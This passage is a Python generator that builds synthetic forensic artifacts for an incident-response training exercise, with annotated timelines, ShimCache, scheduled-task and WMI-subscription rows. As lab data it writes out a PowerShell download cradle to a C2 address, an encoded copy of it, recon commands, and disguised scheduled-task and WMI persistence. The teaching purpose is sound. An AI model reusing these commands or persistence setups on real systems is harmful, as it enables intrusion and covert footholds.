        FILESERVER_IP, 445, "TCP", 2184, 18421, 18, 42,
        "System", "SMB to FILESVR-03 (10.0.4.18) — net use")
    add("2024-11-14 14:33:42", "2024-11-14 14:35:00", WKSTN_IP, 49222,
        FILESERVER_IP, 445, "TCP", 184221, 8421, 184, 21,
        "System", "SMB to FILESVR-03 — file enumeration")
    add("2024-11-14 12:32:04", "2024-11-14 12:32:48", WKSTN_IP, 49210,
        "13.107.42.14", 443, "TCP", 8421, 184221, 18, 184,
        "msedgewebview2.exe", "Microsoft 365 telemetry")
    add("2024-11-14 12:00:00", "2024-11-14 12:00:24", WKSTN_IP, 49211,
        "13.107.4.50", 443, "TCP", 4218, 18421, 12, 42,
        "outlook.exe", "Office 365 endpoints")
    add("2024-11-14 09:32:11", "2024-11-14 09:32:42", WKSTN_IP, 49212,
        "52.96.128.45", 443, "TCP", 8421, 184221, 18, 184,
        "outlook.exe", "Mail sync")
    add("2024-11-14 09:00:00", "2024-11-14 09:48:00", WKSTN_IP, 49213,
        "52.96.128.45", 443, "TCP", 184221, 1842184, 184, 1842,
        "outlook.exe", "Long Outlook connection")
    add("2024-11-14 14:19:38", "2024-11-14 14:19:38", WKSTN_IP, 49224,
        "8.8.8.8", 53, "UDP", 84, 184, 1, 1,
        "svchost.exe", "DNS query for 91.214.47.22 PTR record")
    add("2024-11-14 14:19:38", "2024-11-14 14:19:38", WKSTN_IP, 49225,
        INTERNAL_DNS, 53, "UDP", 84, 184, 1, 1,
        "svchost.exe", "Internal DNS query")
    add("2024-11-14 14:30:00", "2024-11-14 14:30:14", WKSTN_IP, 49226,
        "52.96.128.45", 443, "TCP", 4218, 18421, 12, 42,
        "outlook.exe", "Exchange Online keepalive")
    return rows


def generate_example_curated_timeline(rng: random.Random):
    """Pre-correlated 'analyst view' timeline used by Lab10."""
    rows: List[Dict[str, str]] = []

    def add(t, src, desc, sig, conf, notes):
        rows.append({
            "Time (UTC)": ts(t), "Source Artifact": src,
            "Event Description": desc, "Significance": sig,
            "Confidence": conf, "Notes": notes,
        })

    add("2024-11-14 14:18:55", "JumpList",
        "User opened Q4_Payroll_Review.xlsm via Excel",
        "lure-open", "MEDIUM",
        f"Jump list (Microsoft Excel) target=C:\\Users\\{USER}\\Documents\\Q4_Payroll_Review.xlsm")
    add("2024-11-14 14:18:55", "Prefetch",
        "EXCEL.EXE executed (run count 68)", "lure-open", "HIGH",
        "Confirms execution; high run count indicates legitimate routine use of Excel")
    add("2024-11-14 14:18:55.0214821", "Security",
        "EXCEL.EXE process created (parent OUTLOOK.EXE)",
        "lure-open", "HIGH",
        f"EID 4688; user={USER}; parent=OUTLOOK.EXE; suggests xlsm opened from email")
    add("2024-11-14 14:18:55.5000000", "LNK",
        "Recent LNK created for Q4_Payroll_Review.xlsm",
        "lure-open", "HIGH",
        f"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Q4_Payroll_Review.lnk; "
        "target=Documents\\Q4_Payroll_Review.xlsm")
    add("2024-11-14 14:18:56", "MFT",
        "Excel owner lock file created in Temp", "lure-open", "HIGH",
        f"Users\\{USER}\\AppData\\Local\\Temp\\~$Q4_Payroll_Review.xlsm; "
        "sz=165; normal Excel behavior")
    add("2024-11-14 14:18:57", "MFT",
        "VBE folder created in Temp by Excel", "macro-prep", "MEDIUM",
        f"Users\\{USER}\\AppData\\Local\\Temp\\VBE; "
        "characteristic of VBA macro initialization")
    add("2024-11-14 14:18:58", "MFT",
        "MSForms.exd cache dropped (VBA UserForm)",
        "macro-prep", "MEDIUM",
        f"Users\\{USER}\\AppData\\Local\\Temp\\VBE\\MSForms.exd; "
        "sz=21471; consistent with macro UserForm")
    add("2024-11-14 14:19:38", "Prefetch",
        "POWERSHELL.EXE executed (run count 3)",
        "suspicious-parent", "HIGH",
        "Low run count for an interactive workstation; corroborates 4688 above")
    add("2024-11-14 14:19:38.4218921", "Security",
        "POWERSHELL.EXE spawned by OUTLOOK.EXE",
        "suspicious-parent", "HIGH",
        "EID 4688; PID 0x5128; parent=OUTLOOK.EXE; abnormal — "
        "Office should not spawn PowerShell")
    add("2024-11-14 14:19:38.4218921", "PowerShell",
        f"PS pipeline begin (ConsoleHost, {USER})",
        "c2-staging", "HIGH",
        f"EID 4103; ConsoleHost; user {DOMAIN}\\{USER}; "
        "ScriptName= (no script — interactive)")
    add("2024-11-14 14:19:38.4842184", "PowerShell",
        f"Invoke-WebRequest to {C2_IP} -> Temp\\a.tmp",
        "c2-staging", "HIGH",
        f"EID 4104 ScriptBlock: Invoke-WebRequest -Uri 'https://{C2_IP}/h/u.t' "
        "-OutFile $env:TEMP\\a.tmp")
    add("2024-11-14 14:19:38.5811542", "Security",
        "cmd.exe spawned by powershell.exe", "execution", "HIGH",
        "EID 4688; PID 0x5184; parent=powershell.exe; "
        "subsequent activity will use cmd")
    add("2024-11-14 14:19:42.6000000", "MFT",
        "Encrypted payload a.tmp created in Temp", "staging", "HIGH",
        f"Users\\{USER}\\AppData\\Local\\Temp\\a.tmp; "
        "sz=174080; written by Invoke-WebRequest until 14:19:48")
    add("2024-11-14 14:19:42", "Network",
        f"TCP/443 to {C2_IP} from powershell.exe", "c2-comm", "HIGH",
        f"{WKSTN_IP}:52914 -> {C2_IP}:443; out=1847 in=184221; "
        "flow note: 'first observation of this IP'")
    add("2024-11-14 14:20:11.1000000", "USN",
        "a.tmp deleted (post-decode cleanup)",
        "anti-forensics", "HIGH",
        f"FileDelete; Users\\{USER}\\AppData\\Local\\Temp\\a.tmp; "
        "cleared after decoding")
    add("2024-11-14 14:20:07.6000000", "PowerShell",
        "XOR-decode of a.tmp using key 'F1nd4nc3K3y!'",
        "deobfuscation", "HIGH",
        "EID 4104 ScriptBlock: $bytes = Get-Content $env:TEMP\\a.tmp "
        "-Encoding Byte; bxor with key 'F1nd4nc3K3y!'; writes b.tmp, removes a.tmp")
    add("2024-11-14 14:20:11.2000000", "PowerShell",
        "Move-Item b.tmp -> update.exe", "staging", "HIGH",
        "EID 4104 ScriptBlock: Move-Item $env:TEMP\\b.tmp "
        "$env:TEMP\\update.exe -Force")
    add("2024-11-14 14:21:02.5000000", "PowerShell",
        "Start-Process update.exe", "execution", "HIGH",
        "EID 4104 ScriptBlock: Start-Process $env:TEMP\\update.exe "
        "(immediately before Prefetch first run)")
    add("2024-11-14 14:20:11", "MFT",
        "update.exe materialized in user's Temp", "staging", "HIGH",
        f"Users\\{USER}\\AppData\\Local\\Temp\\update.exe; "
        "sz=174080; InUse=False (already deleted at collection)")
    add("2024-11-14 14:20:11", "Amcache",
        "update.exe registered in Amcache (sha1 captured)",
        "execution", "HIGH",
        "FullPath=...\\Temp\\update.exe; "
        "sha1=a1b2c3d4e5f6789012345678901234567890abcd; "
        "first-seen indicator")
    add("2024-11-14 14:20:11.5000000", "USN",
        "b.tmp renamed to update.exe", "staging", "HIGH",
        f"RenameNewName Users\\{USER}\\AppData\\Local\\Temp\\update.exe; "
        "matches PS Move-Item above")
    add("2024-11-14 14:21:03", "Prefetch",
        "update.exe FIRST execution (run count 1)", "pivot", "HIGH",
        "UPDATE.EXE-89A4B22C.pf; run count 1 — confirms first-time execution; "
        "corroborated by Security 4688 and MFT/USN")
    add("2024-11-14 14:21:03", "USN",
        "Prefetch file UPDATE.EXE-89A4B22C.pf created",
        "pivot", "HIGH",
        "Windows\\System32\\Prefetch\\UPDATE.EXE-89A4B22C.pf; "
        "OS-side evidence of execution")
    add("2024-11-14 14:21:03.4214582", "Security",
        "update.exe process created (parent cmd.exe)", "pivot", "HIGH",
        f"EID 4688; PID 0x5421; NewProcessName=...\\Temp\\update.exe; "
        "parent=cmd.exe")
    add("2024-11-14 14:21:48", "Security",
        "ipconfig /all spawned by update.exe", "discovery", "HIGH",
        "EID 4688; parent=update.exe; CommandLine='ipconfig /all' — "
        "host-info reconnaissance")
    add("2024-11-14 14:21:48", "Network",
        f"TCP/443 to {C2_IP} from update.exe (beacon)",
        "c2-comm", "HIGH",
        f"{WKSTN_IP}:52915 -> {C2_IP}:443; out=4218 in=18421; "
        "small bidirectional — beacon")
    add("2024-11-14 14:21:55", "Security",
        "nltest /domain_trusts spawned by update.exe",
        "discovery", "HIGH",
        "EID 4688; parent=update.exe; CommandLine='nltest /domain_trusts' "
        "— domain reconnaissance")
    add("2024-11-14 14:21:55", "Network",
        f"Large outbound TCP/443 to {C2_IP}",
        "exfil-candidate", "HIGH",
        f"{WKSTN_IP}:52916 -> {C2_IP}:443; out=184221 in=2415891; "
        "flow note 'possible exfil'")
    add("2024-11-14 14:22:14", "Security",
        "'net group Domain Admins /domain' run by update.exe",
        "discovery", "HIGH",
        'EID 4688; parent=update.exe; CommandLine=net group "Domain Admins" /domain')
    add("2024-11-14 14:22:42", "Security",
        "'arp -a' run by update.exe", "discovery", "HIGH",
        "EID 4688; parent=update.exe; ARP cache enumeration for lateral targets")
    add("2024-11-14 14:23:44", "USN",
        "update.exe deleted from Temp (cleanup)",
        "anti-forensics", "HIGH",
        f"FileDelete Users\\{USER}\\AppData\\Local\\Temp\\update.exe; "
        "corroborates MFT InUse=False")
    add("2024-11-14 14:30:00", "SRUM",
        "SRUM rollup: powershell.exe sent 128421 / recv 1842184",
        "c2-comm", "HIGH",
        "Hourly SRUM bucket attributes the initial Invoke-WebRequest "
        "fetch volume to powershell.exe")
    add("2024-11-14 14:30:00", "SRUM",
        "SRUM rollup: update.exe sent 184221 / recv 2415891",
        "exfil-candidate", "HIGH",
        "Independent corroboration of the 14:21:55 outbound flow; same "
        "byte counts under same process — high-confidence cross-source agreement")
    add("2024-11-14 14:31:05.4218421", "Security",
        f"Network logon (type 3) from {ADVERSARY_INBOUND_IP}",
        "lateral-move", "HIGH",
        f"EID 4624; LogonType=3; NtLmSsp; src={ADVERSARY_INBOUND_IP} — "
        f"adversary-controlled pivot host (NOT FILESVR-03; FILESVR-03 is {FILESERVER_IP})")
    add("2024-11-14 14:33:00", "Security",
        "Local group membership enumerated by update.exe",
        "discovery", "HIGH",
        f"EID 4798; CallerProcessName=...\\Temp\\update.exe; "
        f"targets {USER}'s groups")
    add("2024-11-14 14:33:18", "Network",
        f"SMB/445 to {FILESERVER} ({FILESERVER_IP})",
        "lateral-move", "HIGH",
        f"{WKSTN_IP}:49221 -> {FILESERVER_IP}:445; aligned with EID 4648; "
        "'net use' traffic")
    add("2024-11-14 14:33:18.4218421", "Security",
        f"Explicit-credential logon attempt to {FILESERVER}",
        "lateral-move", "HIGH",
        f"EID 4648; TargetServer={FILESERVER}; ProcessName=cmd.exe; "
        f"user={USER}")
    add("2024-11-14 14:33:19.0124211", "Security",
        f"'net use \\\\{FILESERVER}\\Finance' executed",
        "lateral-move", "HIGH",
        f"EID 4688; parent=cmd.exe; CommandLine includes "
        f"net use \\\\{FILESERVER}\\Finance")
    add("2024-11-14 14:33:42", "Network",
        f"Large SMB/445 transfer to {FILESERVER}",
        "lateral-move,exfil-candidate", "HIGH",
        f"{WKSTN_IP}:49222 -> {FILESERVER_IP}:445; out=184221; "
        "flow note 'file enumeration'")
    add("2024-11-14 14:38:00", "Security",
        f"Network session 4624 from {ADVERSARY_INBOUND_IP} logged off",
        "noise", "MEDIUM",
        f"EID 4634; TargetUserName={USER}; LogonType=3; "
        "bookend of the inbound session")
    # Sort by Time (UTC) so the file is a canonical chronology regardless of
    # the order add() calls were issued in above.
    rows.sort(key=lambda r: r["Time (UTC)"])
    return rows


# ---------------------------------------------------------------------------
# ShimCache / AppCompatCache
# ---------------------------------------------------------------------------

def generate_shimcache(rng: random.Random) -> List[Dict[str, str]]:
    """AppCompatCacheParser-style output for the WKSTN-221 SYSTEM hive.

    Two properties of this file are load-bearing for the chapter:

    1. **Order is insertion order, not time order.** ``CacheEntryPosition``
       0 is the most recently shimmed binary. ``LastModifiedTimeUTC`` is the
       *file's* ``$STANDARD_INFORMATION`` last-modified time, so it does not
       decrease monotonically as the position increases. Sorting this file
       by timestamp destroys the only ordering signal it carries.
    2. **``Executed`` is ``NA`` on every row.** See ``SHIMCACHE_EXECUTED``.

    Position 0 is ``update.exe``: the last binary the application-compat
    subsystem looked at before collection. Its ``LastModifiedTimeUTC``
    (14:20:11) matches the MFT ``$SI`` modified time for entry 22417 — the
    binary was deleted at 14:23:44 but the cache entry survives it. That
    pairing (deleted file, surviving ShimCache row) is the whole reason the
    artifact is in the book.
    """
    _ = rng
    rows: List[Dict[str, str]] = []

    def add(path: str, last_modified: str) -> None:
        rows.append({
            "ControlSet": SHIMCACHE_CONTROLSET,
            "CacheEntryPosition": str(len(rows)),
            "Path": path,
            "LastModifiedTimeUTC": ts(last_modified),
            "Executed": SHIMCACHE_EXECUTED,
            "Duplicate": "False",
            "SourceFile": SHIMCACHE_SOURCE,
        })

    temp = f"C:\\Users\\{USER}\\AppData\\Local\\Temp"
    sys32 = "C:\\Windows\\System32"
    office = "C:\\Program Files\\Microsoft Office\\root\\Office16"
    ps_home = f"{sys32}\\WindowsPowerShell\\v1.0"
    os_build = "2024-09-12 09:21:14.5000000"

    # --- Incident window (most recent first) -------------------------------
    add(f"{temp}\\update.exe", "2024-11-14 14:20:11.0500000")
    add(f"{sys32}\\net1.exe", os_build)
    add(f"{sys32}\\net.exe", os_build)
    add(f"{sys32}\\arp.exe", os_build)
    add(f"{sys32}\\nltest.exe", os_build)
    add(f"{sys32}\\ipconfig.exe", os_build)
    add(f"{sys32}\\conhost.exe", os_build)
    add(f"{sys32}\\cmd.exe", os_build)
    add(f"{ps_home}\\powershell.exe", os_build)
    add(f"{office}\\EXCEL.EXE", "2024-11-04 11:00:00.0000000")
    add(f"{office}\\OUTLOOK.EXE", "2024-11-04 11:00:00.0000000")

    # --- Same-day but pre-incident ----------------------------------------
    add(f"{office}\\WINWORD.EXE", "2024-11-04 11:00:00.0000000")
    add(f"{sys32}\\NOTEPAD.EXE", os_build)
    add(f"{sys32}\\wbem\\WMIC.exe", os_build)
    add(f"{sys32}\\taskhostw.exe", os_build)
    add(f"{sys32}\\RuntimeBroker.exe", os_build)
    add(f"{sys32}\\sihost.exe", os_build)
    add("C:\\Windows\\Explorer.EXE", "2024-09-12 09:21:14.5000000")

    # --- Overnight patch cycle (2024-11-14 03:02 reboot window) -----------
    add("C:\\Windows\\SoftwareDistribution\\Download\\Install\\"
        "AM_Delta_Patch_1.421.184.0.exe", "2024-11-14 03:01:48.0000000")
    add("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\"
        "4.18.24090.11-0\\MpCmdRun.exe", "2024-11-08 03:14:00.0000000")
    add("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\"
        "4.18.24090.11-0\\MsMpEng.exe", "2024-11-08 03:14:00.0000000")
    add(f"{sys32}\\wuauclt.exe", os_build)
    add(f"{sys32}\\TrustedInstaller.exe", os_build)
    add(f"{sys32}\\wermgr.exe", os_build)
    add(f"{sys32}\\svchost.exe", os_build)
    add(f"{sys32}\\services.exe", os_build)

    # --- Older background: OS binaries that have been in the cache for
    #     weeks. Note several of these have *newer* file timestamps than
    #     rows above them — position, not timestamp, is the ordering.
    add(f"{sys32}\\dllhost.exe", os_build)
    add(f"{sys32}\\SearchIndexer.exe", os_build)
    add(f"{sys32}\\SearchProtocolHost.exe", os_build)
    add(f"{sys32}\\SearchFilterHost.exe", os_build)
    add(f"{sys32}\\consent.exe", os_build)
    add(f"{sys32}\\dwm.exe", os_build)
    add(f"{sys32}\\LogonUI.exe", os_build)
    add(f"{sys32}\\userinit.exe", os_build)
    add(f"{sys32}\\winlogon.exe", os_build)
    add(f"{sys32}\\lsass.exe", os_build)
    add(f"{sys32}\\spoolsv.exe", os_build)
    add(f"{sys32}\\audiodg.exe", os_build)
    add(f"{sys32}\\ctfmon.exe", os_build)
    add(f"{sys32}\\SgrmBroker.exe", os_build)
    add(f"{sys32}\\WmiPrvSE.exe", os_build)
    add(f"{sys32}\\backgroundTaskHost.exe", os_build)
    add(f"{sys32}\\smartscreen.exe", os_build)
    add("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "2024-11-04 03:14:00.0000000")
    add("C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
        "2024-11-04 03:14:00.0000000")
    add(f"{office}\\MSOSYNC.EXE", "2024-11-04 11:00:00.0000000")
    add(f"{office}\\OSPPSVC.EXE", "2024-11-04 11:00:00.0000000")
    add("C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\"
        "OfficeClickToRun.exe", "2024-11-04 11:00:00.0000000")
    add("C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
        "2024-10-22 03:14:00.0000000")
    return rows


# ---------------------------------------------------------------------------
# Scheduled tasks
# ---------------------------------------------------------------------------

# The scheduled task the adversary registered. Rather than referencing a
# binary that does not exist anywhere else in the dataset, it re-runs the
# *same* download cradle that appears in the EID 4688 command line for
# powershell.exe — so decoding the task's ``-EncodedCommand`` argument and
# decoding the 4688 argument yield the identical string. That equality is
# the correlation exercise.
TASK_ENCODED_PS = (
    "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAg"
    "ACcAaAB0AHQAcABzADoALwAvADkAMQAuADIAMQA0AC4ANAA3AC4AMgAyAC8A"
    "aAAvAHUALgB0ACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABF"
    "AE0AUABcAGEALgB0AG0AcAA="
)

# schtasks.exe reports a task that has never executed with the sentinel
# last-run time 1999-11-30 00:00:00 and last result 267011 (0x00041303,
# SCHED_S_TASK_HAS_NOT_RUN). Responders learn to read that pair as
# "registered but never fired" — which is exactly the state this task is
# in, because the user never logged off before the host was contained.
NEVER_RUN_TIME = "1999-11-30 00:00:00"
NEVER_RUN_RESULT = "267011"


def generate_scheduled_tasks(rng: random.Random) -> List[Dict[str, str]]:
    """``\\Windows\\System32\\Tasks`` inventory (Get-ScheduledTask style).

    One attacker-registered task (``WindowsUpdateSync``) sits among
    legitimate Windows tasks. The give-aways are the ones the chapter
    teaches to look for: a task in a Microsoft-branded folder whose
    ``Author`` is a *user* rather than ``Microsoft Corporation``, a
    ``Created`` timestamp inside the incident window, and an action that
    is ``powershell.exe`` with an encoded command rather than a signed
    binary in ``System32``.
    """
    _ = rng
    rows: List[Dict[str, str]] = []

    def add(name, path, author, trig, trig_detail, action, args, enabled,
            created, last_run, next_run, result, run_as, notes):
        rows.append({
            "TaskName": name, "TaskPath": path, "Author": author,
            "TriggerType": trig, "TriggerDetail": trig_detail,
            "Action": action, "Arguments": args, "Enabled": enabled,
            "Created": ts(created) if created else "",
            "LastRunTime": ts(last_run) if last_run else "",
            "NextRunTime": ts(next_run) if next_run not in ("", "N/A")
            else next_run,
            "LastTaskResult": result, "RunAsUser": run_as,
            "SourceFile": f"C:\\Windows\\System32\\Tasks{path}{name}",
            "Notes": notes,
        })

    ms = "Microsoft Corporation"
    sys32 = "C:\\Windows\\System32"
    ps_exe = f"{sys32}\\WindowsPowerShell\\v1.0\\powershell.exe"

    # --- The attacker-registered task -------------------------------------
    add("WindowsUpdateSync", "\\Microsoft\\Windows\\WindowsUpdate\\",
        f"{DOMAIN}\\{USER}", "Logon",
        f"At log on of {DOMAIN}\\{USER}",
        ps_exe,
        f"-NoProfile -WindowStyle Hidden -EncodedCommand {TASK_ENCODED_PS}",
        "True", "2024-11-14 14:22:58", NEVER_RUN_TIME, "N/A",
        NEVER_RUN_RESULT, f"{DOMAIN}\\{USER}",
        "SUSPICIOUS — user-authored task in a Microsoft task folder; "
        "created 14:22:58 (inside the incident window, 46 s before "
        "update.exe was deleted); action is powershell.exe with the same "
        "-EncodedCommand payload seen in the EID 4688 at 14:19:38; "
        "never executed (last result 0x41303)")

    # --- Legitimate Windows tasks (noise) ---------------------------------
    add("GoogleUpdateTaskMachineUA", "\\", "SYSTEM", "Daily",
        "At 07:00 every day", "C:\\Program Files (x86)\\Google\\Update\\"
        "GoogleUpdate.exe", "/ua /installsource scheduler", "True",
        "2024-09-19 14:14:08", "2024-11-14 07:00:00",
        "2024-11-15 07:00:00", "0", "SYSTEM", "Third-party updater")
    add("MicrosoftEdgeUpdateTaskMachineCore", "\\", "SYSTEM", "Daily",
        "At 06:30 every day",
        "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\"
        "MicrosoftEdgeUpdate.exe", "/c", "True",
        "2024-09-12 09:42:11", "2024-11-14 06:30:00",
        "2024-11-15 06:30:00", "0", "SYSTEM", "Edge updater (core)")
    add("MicrosoftEdgeUpdateTaskMachineUA", "\\", "SYSTEM", "Logon",
        "At log on of any user",
        "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\"
        "MicrosoftEdgeUpdate.exe", "/ua /installsource scheduler", "True",
        "2024-09-12 09:42:11", "2024-11-14 08:43:20", "N/A", "0", "SYSTEM",
        "Edge updater (user agent)")
    add("OfficeTelemetryAgentLogOn", "\\Microsoft\\Office\\", ms, "Logon",
        "At log on of any user", f"{sys32}\\rundll32.exe",
        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\'
        'msoia.exe",RunOnLogon', "True", "2024-09-12 09:38:44",
        "2024-11-14 08:43:22", "N/A", "0", "Users", "Office telemetry")
    add("OfficeClickToRun", "\\Microsoft\\Office\\", ms, "Daily",
        "At 03:00 every day", "C:\\Program Files\\Common Files\\"
        "Microsoft Shared\\ClickToRun\\OfficeC2RClient.exe",
        "/update user", "True", "2024-09-12 09:38:44",
        "2024-11-14 03:00:00", "2024-11-15 03:00:00", "0", "SYSTEM",
        "Office update channel")
    add("ProgramDataUpdater",
        "\\Microsoft\\Windows\\Application Experience\\", ms, "Daily",
        "At 02:30 every day, randomized within 4 hours",
        f"{sys32}\\compattelrunner.exe", "-maintenance", "True",
        "2024-09-12 09:21:14", "2024-11-14 02:41:18",
        "2024-11-15 02:30:00", "0", "SYSTEM",
        "Populates Amcache — genuinely Microsoft-authored")
    add("MicrosoftCompatibilityAppraiser",
        "\\Microsoft\\Windows\\Application Experience\\", ms, "Daily",
        "At 03:00 every day", f"{sys32}\\compattelrunner.exe", "", "True",
        "2024-09-12 09:21:14", "2024-11-14 03:00:00",
        "2024-11-15 03:00:00", "0", "SYSTEM", "Compatibility appraiser")
    add("ScheduledDefrag", "\\Microsoft\\Windows\\Defrag\\", ms, "Weekly",
        "At 01:00 every Wednesday", f"{sys32}\\defrag.exe",
        "-c -h -o -$", "True", "2024-09-12 09:21:14",
        "2024-11-13 01:00:00", "2024-11-20 01:00:00", "0", "SYSTEM",
        "Storage optimisation")
    add("ScheduledScan", "\\Microsoft\\Windows\\Windows Defender\\", ms,
        "Daily", "At 04:00 every day",
        "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\"
        "4.18.24090.11-0\\MpCmdRun.exe", "Scan -ScheduleJob", "True",
        "2024-09-12 09:21:14", "2024-11-14 04:00:00",
        "2024-11-15 04:00:00", "0", "SYSTEM", "Defender scheduled scan")
    add("SilentCleanup", "\\Microsoft\\Windows\\DiskCleanup\\", ms,
        "Custom", "On a custom event / disk-space condition",
        f"{sys32}\\cleanmgr.exe", "/autoclean /d C:", "True",
        "2024-09-12 09:21:14", "2024-11-10 22:14:08", "N/A", "0", "SYSTEM",
        "Known UAC-bypass target — benign here, but worth noting")
    add("UpdateOrchestrator", "\\Microsoft\\Windows\\UpdateOrchestrator\\",
        ms, "Daily", "At 03:02 every day", f"{sys32}\\usoclient.exe",
        "StartScan", "True", "2024-09-12 09:21:14", "2024-11-14 03:02:11",
        "2024-11-15 03:02:00", "0", "SYSTEM",
        "Fires at the 03:02 reboot seen in system-evtx.csv")
    add("UserTask", "\\Microsoft\\Windows\\Wininet\\", ms, "Logon",
        "At log on of any user", f"{sys32}\\rundll32.exe",
        "inetcpl.cpl,ClearMyTracksByProcess 8", "True",
        "2024-09-12 09:21:14", "2024-11-14 08:43:18", "N/A", "0", "Users",
        "WinINet maintenance")
    add("GatherNetworkInfo", "\\Microsoft\\Windows\\NetTrace\\", ms,
        "Boot", "At system startup", f"{sys32}\\gatherNetworkInfo.vbs", "",
        "True", "2024-09-12 09:21:14", "2024-11-14 03:02:44", "N/A", "0",
        "SYSTEM",
        "Legitimately does host discovery — an easy false positive")
    add("BackupServiceSync", "\\", f"{DOMAIN}\\svc-backup", "Daily",
        "At 02:14 every day", "C:\\Program Files\\BackupAgent\\"
        "bkupagent.exe", "--sync --quiet", "True", "2024-09-19 11:04:22",
        "2024-11-14 02:14:14", "2024-11-15 02:14:00", "0",
        f"{DOMAIN}\\svc-backup",
        "Matches the 02:14 svc-backup logon in security-evtx.csv")
    add("OneDrive Standalone Update Task-S-1-5-21-...-1142", "\\", USER,
        "Daily", "At 09:42 every day",
        f"C:\\Users\\{USER}\\AppData\\Local\\Microsoft\\OneDrive\\"
        "OneDriveStandaloneUpdater.exe", "", "True",
        "2024-09-19 14:11:42", "2024-11-14 09:42:00",
        "2024-11-15 09:42:00", "0", f"{DOMAIN}\\{USER}",
        "User-authored, but Microsoft-signed binary in the user's own "
        "OneDrive install — the benign counterpart to the row above")
    return rows


# ---------------------------------------------------------------------------
# WMI event-subscription persistence
# ---------------------------------------------------------------------------

def generate_wmi_persistence(rng: random.Random) -> List[Dict[str, str]]:
    """``root\\subscription`` inventory (Get-WmiObject / PyWMIPersistenceFinder).

    A WMI event subscription is persistence only when all three pieces are
    present: an ``__EventFilter``, an event consumer, and a
    ``__FilterToConsumerBinding`` joining them. This file deliberately
    contains one complete malicious triple, the built-in benign triple that
    ships with Windows, and one *orphaned* filter with no binding — so the
    exercise is not "find the one weird name" but "check which rows are
    actually bound".
    """
    _ = rng
    rows: List[Dict[str, str]] = []

    def add(ns, consumer, ctype, filt, query, lang, cmd, bound, created,
            notes):
        rows.append({
            "Namespace": ns, "ConsumerName": consumer,
            "ConsumerType": ctype, "FilterName": filt,
            "FilterQuery": query, "QueryLanguage": lang,
            "CommandOrScript": cmd, "BindingPresent": bound,
            "Created": ts(created) if created else "",
            "Notes": notes,
        })

    ps_exe = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"

    # --- The malicious subscription (filter + consumer + binding) ---------
    add("root\\subscription", "WindowsUpdateConsumer",
        "CommandLineEventConsumer", "WindowsUpdateFilter",
        "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE "
        "TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND "
        "TargetInstance.SystemUpTime >= 200 AND "
        "TargetInstance.SystemUpTime < 320",
        "WQL",
        f'{ps_exe} -NoProfile -WindowStyle Hidden '
        f'-EncodedCommand {TASK_ENCODED_PS}',
        "True", "2024-11-14 14:23:02",
        "MALICIOUS — the classic uptime-window trigger (fires ~200-320 s "
        "after every boot). Filter, consumer and binding are all present, "
        "so this is live persistence. Same -EncodedCommand payload as the "
        "14:19:38 EID 4688 and the WindowsUpdateSync scheduled task; "
        "created 14:23:02, four seconds after the task")

    # --- Built-in Windows subscription (benign) ---------------------------
    add("root\\subscription", "SCM Event Log Consumer",
        "NTEventLogEventConsumer", "SCM Event Log Filter",
        "select * from MSFT_SCMEventLogEvent", "WQL",
        "(writes to the Application event log — no command line)",
        "True", "2024-09-12 09:21:14",
        "Benign — ships with Windows. Present on essentially every host; "
        "learn to recognise it so it stops being a finding")
    add("root\\subscription", "BVTConsumer", "CommandLineEventConsumer",
        "BVTFilter",
        "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE "
        "TargetInstance ISA 'Win32_Processor'", "WQL",
        "cscript.exe KernelBVTConsumer.vbs", "False",
        "2024-09-12 09:21:14",
        "Benign build-verification leftover. Note BindingPresent=False — "
        "consumer exists but nothing is wired to it, so it never fires")

    # --- Management tooling (benign, but noisy) ---------------------------
    add("root\\subscription", "SmsMonitoringConsumer",
        "CommandLineEventConsumer", "SmsHardwareInventoryFilter",
        "SELECT * FROM __InstanceCreationEvent WITHIN 600 WHERE "
        "TargetInstance ISA 'Win32_LogicalDisk'", "WQL",
        "C:\\Windows\\CCM\\CcmExec.exe -inventory", "True",
        "2024-09-19 11:04:18",
        "Benign — the management agent's own subscription. Structurally "
        "identical to the malicious row above; only the binary path and "
        "the creation date separate them")
    add("root\\subscription", "", "",
        "PowerShellRemotingFilter",
        "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE "
        "TargetInstance ISA 'Win32_Process' AND "
        "TargetInstance.Name = 'wsmprovhost.exe'", "WQL", "", "False",
        "2024-10-22 09:14:08",
        "Orphaned filter — no consumer and no binding. Left behind by an "
        "uninstalled monitoring product; inert, but it will show up in "
        "any filter enumeration")
    add("root\\default", "TimerConsumer1", "CommandLineEventConsumer",
        "TimerFilter1",
        "SELECT * FROM __TimerEvent WHERE TimerID = 'HourlyTimer'", "WQL",
        "C:\\Program Files\\BackupAgent\\bkupagent.exe --heartbeat",
        "True", "2024-09-19 11:04:22",
        "Benign, but note the namespace: root\\default, not "
        "root\\subscription. Enumerating only root\\subscription would "
        "miss it — and would miss an adversary who did the same thing")
    return rows


# ---------------------------------------------------------------------------
# Dispatch table
# ---------------------------------------------------------------------------

GENERATORS: Dict[str, Callable[[random.Random], List[Dict[str, str]]]] = {
    "mft.csv": generate_mft,
    "usn-journal.csv": generate_usn_journal,
    "security-evtx.csv": generate_security_evtx,
    "system-evtx.csv": generate_system_evtx,
    "powershell-evtx.csv": generate_powershell_evtx,
    "prefetch.csv": generate_prefetch,
    "amcache.csv": generate_amcache,
    "srum.csv": generate_srum,
    "lnk-files.csv": generate_lnk_files,
    "jump-lists.csv": generate_jump_lists,
    "registry-runkeys.csv": generate_registry_runkeys,
    "registry-services.csv": generate_registry_services,
    "network-flow.csv": generate_network_flow,
    "shimcache.csv": generate_shimcache,
